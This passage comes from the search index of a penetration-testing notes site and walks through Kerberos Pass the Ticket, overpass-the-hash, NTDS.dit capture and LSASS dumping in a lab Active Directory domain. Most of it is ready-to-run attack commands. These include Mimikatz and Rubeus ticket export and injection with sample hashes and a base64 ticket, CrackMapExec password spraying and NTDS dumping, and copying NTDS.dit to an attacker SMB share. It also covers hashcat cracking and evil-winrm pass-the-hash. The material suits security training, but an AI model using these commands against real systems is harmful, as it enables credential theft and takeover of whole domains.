valid.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#searching-for-ccache-files-in-tmp","title":"Searching for ccache Files in /tmp","text":"<ul> <li><code>ls -la /tmp</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#abusing-keytab-files","title":"Abusing KeyTab Files","text":"<p>As attackers, we may have several uses for a keytab file. The first thing we can do is impersonate a user using kinit. To use a keytab file, we need to know which user it was created for. klist is another application used to interact with Kerberos on Linux. This application reads information from a keytab file. Let's see that with the following command:</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#listing-keytab-file-information","title":"Listing keytab File Information","text":"<ul> <li><code>klist -k -t</code></li> </ul> <p>The ticket corresponds to the user Carlos. We can now impersonate the user with kinit. Let's confirm which ticket we are using with klist and then import Carlos's ticket into our session with kinit.</p> <p><code>Note: kinit is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.</code></p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#impersonating-a-user-with-a-keytab","title":"Impersonating a User with a keytab","text":"<pre><code>klist\nkinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab\nklist\n</code></pre> <p>We can attempt to access the shared folder \\dc01\\carlos to confirm our access.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/#connecting-to-smb-share-as-carlos","title":"Connecting to SMB Share as Carlos","text":"<ul> <li><code>smbclient //dc01/carlos -k -c ls</code></li> </ul> <p><code>Note: To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable KRB5CCNAME.</code></p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/","title":"Pass the Ticket (PtT) from Windows","text":"<p>Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. We'll cover several ways to perform a PtT attack from Windows and Linux. In this section, we'll focus on Windows attacks, and in the following section, we'll cover attacks from Linux.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#kerberos-protocol-refresher","title":"Kerberos Protocol Refresher","text":"<p>The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.</p> <pre><code>- `The TGT - Ticket Granting Ticket is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or TGS.`\n\n- `The TGS - Ticket Granting Service is requested by users who want to use a service. These tickets allow services to verify the user's identity.`\n</code></pre> <p>When a user requests a TGT, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user's identity (because the domain knows the user's password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.</p> <p>If the user wants to connect to an MSSQL database, it will request a Ticket Granting Service (TGS) to The Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT). Then it will give the TGS to the MSSQL database server for authentication.</p> <p>It's recommended to take a look at the Kerberos, DNS, LDAP, MSRPC section in the module Introduction to Active Directory for a high-level overview of how this protocol works.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#pass-the-ticket-ptt-attack","title":"Pass the Ticket (PtT) Attack","text":"<p>We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:</p> <pre><code>- `Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.`\n- `Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.`\n</code></pre> <p>Before we perform a Pass the Ticket (PtT) attack, let's see some methods to get a ticket using Mimikatz and Rubeus. Scenario</p> <p>Let's imagine we are on a pentest, and we manage to phish a user and gain access to the user's computer. We found a way to obtain administrative privileges on this computer and are working with local administrator rights. Let's explore several ways we can manage to get access tickets on this computer and how we can create new tickets.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#harvesting-kerberos-tickets-from-windows","title":"Harvesting Kerberos Tickets from Windows","text":"<p>On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.</p> <p>We can harvest all tickets from a system using the Mimikatz module sekurlsa::tickets /export. The result is a list of files with the extension .kirbi, which contain the tickets.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#mimikatz-export-tickets","title":"Mimikatz - Export Tickets","text":"<pre><code>mimikatz.exe\nprivilege::debug\nsekurlsa::tickets /export\nexit\ndir *.kirbi\n</code></pre> <p>The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.</p> <p><code>Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.</code></p> <p>We can also export tickets using Rubeus and the option dump. This option can be used to dump all tickets (if running as a local administrator). Rubeus dump, instead of giving us a file, will print the ticket encoded in base64 format. We are adding the option /nowrap for easier copy-paste.</p> <ul> <li><code>Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run \"sekurlsa::ekeys\" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#rubeus-export-tickets","title":"Rubeus - Export Tickets","text":"<pre><code>Rubeus.exe dump /nowrap\n</code></pre> <p><code>Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.</code></p> <p>This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the OverPass the Hash or Pass the Key technique.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#pass-the-key-or-overpass-the-hash","title":"Pass the Key or OverPass the Hash","text":"<p>The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT). This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation Abusing Microsoft Kerberos - Sorry you guys don't get it. Also Will Schroeder adapted their project to create the Rubeus tool.</p> <p>To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#mimikatz-extract-kerberos-keys","title":"Mimikatz - Extract Kerberos Keys","text":"<pre><code>mimikatz.exe\nprivilege::debug\nsekurlsa::ekeys\n</code></pre> <p>Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#mimikatz-pass-the-key-or-overpass-the-hash","title":"Mimikatz - Pass the Key or OverPass the Hash","text":"<pre><code>mimikatz.exe\nprivilege::debug\nsekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f\n</code></pre> <p>This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.</p> <p>To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#rubeus-pass-the-key-or-overpass-the-hash","title":"Rubeus - Pass the Key or OverPass the Hash","text":"<ul> <li><code>Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /nowrap</code></li> </ul> <p><code>Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.</code></p> <p>To learn more about the difference between Mimikatz sekurlsa::pth and Rubeus asktgt, consult the Rubeus tool documentation Example for OverPass the Hash.</p> <p><code>Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an \"encryption downgrade.\"</code></p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#pass-the-ticket-ptt","title":"Pass the Ticket (PtT)","text":"<p>Now that we have some Kerberos tickets, we can use them to move laterally within an environment.</p> <p>With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#rubeus-pass-the-ticket","title":"Rubeus Pass the Ticket","text":"<ul> <li><code>Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt</code></li> </ul> <p>Note that now it displays Ticket successfully imported!.</p> <p>Another way is to import the ticket into the current session using the .kirbi file from the disk.</p> <p>Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#rubeus-pass-the-ticket_1","title":"Rubeus - Pass the Ticket","text":"<ul> <li><code>Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi</code></li> </ul> <p>We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#convert-kirbi-to-base64-format","title":"Convert .kirbi to Base64 Format","text":"<ul> <li><code>[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi\"))</code></li> </ul> <p>Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#pass-the-ticket-base64-format","title":"Pass the Ticket - Base64 Format","text":"<ul> <li><code>Rubeus.exe ptt /ticket:  doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFpbmxhbmVmcmVpZ2h0Lmh0YqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6achxvCNYTFWQq8vRODrOPHeztKqfJZJ/0d/1Klcd/wzzHUtrRwyl+aPiVpUaWIsmBohBC3QJP4v0EgMs0YHmMXXCoB5ZtLtnvw2bAmWUzzWr6puFOf94ViYdkanCbwK0UcIrZYmHcjAYuJ/kwY95cWmgdR5vEmc0DH4UMg1/CIZ6vPcc8QSOEW84xNJGkLfqi1oj9rMfUZ91T/crPZPKn1pL2JnLeAWUtzL0PQ8/4v5gnnC8dT8tjo0vC5zhmvxrs/8mwMVjU/ef0hNDt7W2XkwV8byDL8hKkgtXmYdlLySK0YKXoKjcYIIYUNyGghbZ0GrlWQx1/7JukyV20inRUsH5HW3e69V8q4+QgeHiXiQM3wFYt1p0LeaGsKUGLDz9TkDJiWNQSAejhjV5cMX7ZcBnj3oLZxyvHlVM1JWbilum4GxIDr4a8kUo3QNu7KbXhSmsWc6bQf9ZpxAq+l7Sj0M1bq9OX5//bqrtTLooXVOAai6lI6irtm0Nq8j2tuo0xbpWoMNA/JMdCLwv1EtGAmgPR4S01Vn57EwFwKQIKC3UU0FzKhBYX1HwW3yLLbNv5oZCaLH0CDiC3nUo89zPvbxfX5rZAqgA3wgnXBpGCNVAiF8CpEtbdc++r6rj87kf+2hDgdZ+gGyJgPXRCcrh64tlLwTlFWqIrvfllJpuElHNHxffq5F8MRQbuG9LSMeg3M4rxdsWYcHNHPQrx2PaAcL79s38GrB5d+w0mMnqs7IeHUY7o1GKVI6/5vohOjRGX8a+6Kfw8IgClGZozOxNyPzt0b0iibraEqycjBuuK0oReYGbOVhQtc9mDh8MDSVPsQb7Iw8Xa8ANRmSuI5QvkhlaPR+4zk39scpkst6kz6gLM9OUMmAB8Ui5Z2wd0Z39okn2B2rOWWcXWc6hYzMhryBQ8Ot+24chW3BoniXad0ZTrKHbKXPcIzc6CP6p/OG9cPwkY9SoDE7z9wZMyrtwDlfGNjVDTm7au3cYlsio6N7JUl95jJtfaYgF+34zBH6OxdsaK4E5asgxiO6BHzTs3JL+fsA5uuiB4BdaUcroN2wASM03YDnMWXs/J+9HeOisCT+PJtKO4Zz6G5VR3Fsn7OjNWbfuATkI/0q0LCxLTmM11yODh3hUMJEpml5RtHIQmWWOq3PFaY3+2PtpOUa6e0NBg0psWzPZdC2VH9uQ4T4d+Cc/GY2WCaw4mevkRdYbGRy9oH6be0mJojh96nObVw5wh4b5jMTyEoLPgWUTnDKXBamYavSnfpCn9FUxv1E3MvSKntfWVoh/7hwidjl1hZ8KTDDj9YoKk4AfcBroZpf79//9U1U4hKeqm7pLV0TUGZY6le458z8SmVYbEx9Uedc9GnMLutxDCR7RKWKTzFnAztattTLMRw8qx6bhWhx7CYf9LVuuCKj6RXw3xFHKj3Lr67zLA/L/Kx+jgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCBLj1p9IRkM2PHR+ehW/OPT/plYQ7hN71vQiTET7lli7qETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNDAzMjQxMTIxMThaphEYDzIwMjQwMzI0MjEyMTE4WqcRGA8yMDI0MDMzMTExMjExOFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEWlubGFuZWZyZWlnaHQuaHRi</code></li> </ul> <p>Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#mimikatz-pass-the-ticket","title":"Mimikatz - Pass the Ticket","text":"<pre><code>mimikatz.exe \nprivilege::debug\nkerberos::ptt \"C:\\Users\\plaintext\\Desktop\\Mimikatz\\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi\"\nexit\ndir \\\\DC01.inlanefreight.htb\\c$\n</code></pre> <p><code>Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.</code></p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#pass-the-ticket-with-powershell-remoting-windows","title":"Pass The Ticket with PowerShell Remoting (Windows)","text":"<p>PowerShell Remoting allows us to run scripts or commands on a remote computer. Administrators often use PowerShell Remoting to manage remote computers on the network. Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.</p> <p>To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.</p> <p>Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#mimikatz-powershell-remoting-with-pass-the-ticket","title":"Mimikatz - PowerShell Remoting with Pass the Ticket","text":"<p>To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new cmd.exe and execute mimikatz.exe, then import the ticket we collected using kerberos::ptt. Once the ticket is imported into our cmd.exe session, we can launch a PowerShell command prompt from the same cmd.exe and use the command Enter-PSSession to connect to the target machine.</p> <pre><code>mimikatz.exe\nprivilege::debug\nkerberos::ptt \"C:\\Users\\Administrator.WIN01\\Desktop\\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi\"\nexit\npowershell\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#rubeus-powershell-remoting-with-pass-the-ticket","title":"Rubeus - PowerShell Remoting with Pass the Ticket","text":"<p>Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9). The process is hidden by default, but we can specify the flag /show to display the process, and the result is the equivalent of runas /netonly. This prevents the erasure of existing TGTs for the current logon session.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#create-a-sacrificial-process-with-rubeus","title":"Create a Sacrificial Process with Rubeus","text":"<ul> <li><code>Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show</code></li> </ul> <p>The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/#rubeus-pass-the-ticket-for-lateral-movement","title":"Rubeus - Pass the Ticket for Lateral Movement","text":"<pre><code>Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt\npowershell\nEnter-PSSession -ComputerName DC01\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/","title":"Attacking Active Directory &amp; NTDS.dit","text":"<p>Active Directory (AD) is a common and critical directory service in modern enterprise networks. AD is something we will repeatedly encounter, so we need to be familiar with various methods we can use to attack &amp; defend these AD environments. It is safe to conclude that if the organization uses Windows, then AD is used to manage those Windows systems. Attacking AD is such an extensive &amp; significant topic that we have multiple modules covering AD.</p> <p>In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.</p> <p>Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (3389) or other protocols used for remote access on their edge router to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let's consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.</p> <p>Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the hostname of the device proceeded by the Username (Example: WS01/nameofuser) or with direct access to the device then typing ./ at the logon UI in the Username field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this technique.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#dictionary-attacks-against-ad-accounts-using-crackmapexec","title":"Dictionary Attacks against AD accounts using CrackMapExec","text":"<p>Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username &amp;/or password using a customized list of potential usernames and passwords. It can be rather noisy (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of Group Policy.</p> <p>When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to custom tailor our attack as much as possible. In this case, we can consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company's website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#launching-the-attack-with-crackmapexec","title":"Launching the Attack with CrackMapExec","text":"<p>Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch our attack against the target domain controller using a tool such as CrackMapExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. Here is the command to do so:</p> <ul> <li><code>crackmapexec smb 10.129.201.57 -u jmarston -p /usr/share/wordlists/fasttrack.txt</code></li> </ul> <p>In this example, CrackMapExec is using SMB to attempt to logon as user (-u) bwilliamson using a password (-p) list containing a list of commonly used passwords (/usr/share/wordlists/fasttrack.txt). If the admins configured an account lockout policy, this attack could lock out the account that we are targeting. At the time of this writing (January 2022), an account lockout policy is not enforced by default with the default group policies that apply to a Windows domain, meaning it is possible that we will come across environments vulnerable to this exact attack we are practicing.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#event-logs-from-the-attack","title":"Event Logs from the Attack","text":"<p>It can be useful to know what might have been left behind by an attack. Knowing this can make our remediation recommendations more impactful and valuable for the client we are working with. On any Windows operating system, an admin can navigate to Event Viewer and view the Security events to see the exact actions that were logged. This can inform decisions to implement stricter security controls and assist in any potential investigation that might be involved following a breach.</p> <p>Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#capturing-ntdsdit","title":"Capturing NTDS.dit","text":"<p>NT Directory Services (NTDS) is the directory service used with AD to find &amp; organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#connecting-to-a-dc-with-evil-winrm","title":"Connecting to a DC with Evil-WinRM","text":"<ul> <li><code>evil-winrm -i 10.129.202.85  -u bwilliamson -p 'P@ssword!'</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#checking-local-group-membership","title":"Checking Local Group Membership","text":"<p>Once connected, we can check to see what privileges bwilliamson has. We can start with looking at the local group membership using the command: - <code>net localgroup</code></p> <p>We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#checking-user-account-privileges-including-domain","title":"Checking User Account Privileges including Domain","text":"<ul> <li><code>net user bwilliamson</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#creating-shadow-copy-of-c","title":"Creating Shadow Copy of C:","text":"<p>We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read &amp; written to actively without needing to bring a particular application or system down. VSS is used by many different backup &amp; disaster recovery software to perform operations.</p> <ul> <li><code>vssadmin CREATE SHADOW /For=C:</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#copying-ntdsdit-from-the-vss","title":"Copying NTDS.dit from the VSS","text":"<p>We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.</p> <ul> <li><code>cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit</code></li> </ul> <p>Before copying NTDS.dit to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the Attacking SAM section to review that method if needed.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#transferring-ntdsdit-to-attack-host","title":"Transferring NTDS.dit to Attack Host","text":"<p>Now cmd.exe /c move can be used to move the file from the target DC to the share on our attack host. - <code>cmd.exe /c move C:\\NTDS\\NTDS.dit \\\\10.10.15.30\\CompData</code></p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#a-faster-method-using-cme-to-capture-ntdsdit","title":"A Faster Method: Using cme to Capture NTDS.dit","text":"<p>Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.</p> <ul> <li><code>crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#cracking-hashes-gaining-credentials","title":"Cracking Hashes &amp; Gaining Credentials","text":"<p>We can proceed with creating a text file containing all the NT hashes, or we can individually copy &amp; paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.</p> <ul> <li><code>sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#pass-the-hash-considerations","title":"Pass-the-Hash Considerations","text":"<p>We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. Instead of username:clear-text password as the format for login, we can instead use username:password hash. Here is an example of how this would work:</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#pass-the-hash-with-evil-winrm-example","title":"Pass-the-Hash with Evil-WinRM Example","text":"<ul> <li><code>evil-winrm -i 10.129.201.57  -u  Administrator -H \"64f12cddaa88057e06a81b54e73b949b\"</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/","title":"Attacking LSASS","text":""},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/#dumping-lsass-process-memory","title":"Dumping LSASS Process Memory","text":"<p>Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump. Let's cover techniques that can be performed using tools already built-in to Windows.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/#task-manager-method","title":"Task Manager Method","text":"<p>Open Task Manager &gt; Select the Processes tab &gt; Find &amp; right click the Local Security Authority Process &gt; Select Create dump file A file called lsass.DMP is created and saved in:  - <code>C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp</code></p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/#rundll32exe-comsvcsdll-method","title":"Rundll32.exe &amp; Comsvcs.dll Method","text":"<p>The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called rundll32.exe. This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.</p> <p>Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/#finding-lsass-pid-in-cmd","title":"Finding LSASS PID in cmd","text":"<ul> <li><code>tasklist /svc</code> and find lsass.exe and its process ID in the PID field.</li> 